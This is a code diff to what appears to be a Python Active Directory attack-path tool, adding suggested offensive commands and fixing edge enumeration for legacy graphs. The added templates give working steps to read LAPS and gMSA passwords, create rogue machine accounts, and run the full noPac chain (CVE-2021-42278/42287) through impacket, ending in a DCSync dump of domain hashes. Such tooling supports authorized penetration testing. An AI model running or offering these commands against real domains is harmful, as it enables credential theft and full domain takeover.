@@ -202,6 +202,51 @@ SUGGESTED_COMMANDS: dict[str, list[str]] = {
         "bloodyAD --host {dc_ip} -d '{domain}' -u '{user}' -p '{password}' set object '{target}' servicePrincipalName --value 'fake/spn'",
         "GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt",
     ],
+    "ReadLAPSPassword": [
+        "# Read the LAPS password (legacy ms-Mcs-AdmPwd or Windows LAPS ms-LAPS-Password)",
+        "ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' -b '{target_dn}' ms-Mcs-AdmPwd ms-LAPS-Password",
+        "",
+        "# From Windows:",
+        "Get-ADComputer -Identity '{target}' -Properties ms-Mcs-AdmPwd,ms-LAPS-Password | Select Name,ms-Mcs-AdmPwd,ms-LAPS-Password",
+        "",
+        "# Or automated (Linux):",
+        "pyLAPS.py --action get -d '{domain}' -u '{user}' -p '{password}' --dc-ip {dc_ip} -f '{target}'",
+    ],
+    "ReadGMSAPassword": [
+        "# Read the gMSA managed password blob",
+        "python3 gMSADumper.py -u '{user}' -p '{password}' -d '{domain}' -l {dc_ip}",
+        "",
+        "# From Windows (AD + DSInternals modules):",
+        "Get-ADServiceAccount -Identity '{target}' -Properties 'msDS-ManagedPassword' | ConvertFrom-ADManagedPasswordBlob",
+    ],
+    "MachineAccountQuota": [
+        "# MAQ allows any domain account to create machine accounts — check it:",
+        "ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' -b '{domain_dn}' -s base ms-DS-MachineAccountQuota",
+        "",
+        "# Create a computer account (no admin rights needed):",
+        "impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' -dc-ip {dc_ip} '{domain}/{user}:{password}'",
+        "",
+        "# Then abuse it: RBCD, ADIDNS takeover, or sAMAccountName spoofing (see SAMAccountNameSpoofing)",
+    ],
+    "SAMAccountNameSpoofing": [
+        "# nopac chain (CVE-2021-42278 + CVE-2021-42287) — requires MAQ > 0",
+        "# 1. Create a computer account:",
+        "impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' -dc-ip {dc_ip} '{domain}/{user}:{password}'",
+        "",
+        "# 2. Rename it to the DC's sAMAccountName without the trailing '$':",
+        "impacket-renamecomputer -computer-name 'FAKE01$' -newname '{dc_name}' -dc-ip {dc_ip} '{domain}/{user}:{password}'",
+        "",
+        "# 3. Request a TGT for the spoofed account:",
+        "getTGT.py '{domain}/{dc_name}$:Passw0rd!' -dc-ip {dc_ip}",
+        "export KRB5CCNAME={dc_name}$.ccache",
+        "",
+        "# 4. Request a service ticket with an unknown SPN — KDC falls back to the DC account:",
+        "getST.py -spn 'cifs/{dc_fqdn}' -k -no-pass '{domain}/{dc_name}$' -dc-ip {dc_ip}",
+        "export KRB5CCNAME={dc_name}$@cifs_{dc_fqdn}@*.ccache",
+        "",
+        "# 5. Use the DC ticket (DCSync as system):",
+        "secretsdump.py -k -no-pass '{domain}/{dc_name}$'@{dc_ip} -just-dc-ntlm",
+    ],
 }
 
 
@@ -284,8 +329,16 @@ def get_all_paths(ag: ADGraph, origin: str, target_set: Optional[set[str]] = Non
         if len(edge_refs) >= max_depth:
             continue
 
+        if graph.is_multigraph():
+            outgoing_raw = graph.out_edges(current, keys=True, data=True)
+        else:
+            # Legacy plain DiGraph bundles (pre-multigraph saves)
+            outgoing_raw = (
+                (s, t, d.get("type"), d)
+                for s, t, d in graph.out_edges(current, data=True)
+            )
         outgoing = sorted(
-            graph.out_edges(current, keys=True, data=True),
+            outgoing_raw,
             key=lambda item: (str(item[1]), str(item[3].get("type", item[2]))),
         )
         for source, target, key, data in outgoing:
